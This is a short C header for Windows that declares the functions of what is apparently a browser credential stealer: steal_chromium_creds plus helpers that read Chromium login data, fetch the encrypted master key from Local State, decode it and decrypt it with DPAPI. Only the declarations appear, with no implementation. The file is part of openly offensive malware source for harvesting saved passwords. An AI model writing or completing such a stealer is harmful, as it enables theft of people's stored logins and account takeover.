#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <windows.h>

#include "logins.h"

int steal_chromium_creds();
static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                           Login *loginsOut[]);
static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                      size_t *decodedKeySizeOut);
static int decrypt_key(BYTE *encryptedKey, size_t encryptedKeySize, DATA_BLOB *decryptedKeyOut);

#endif
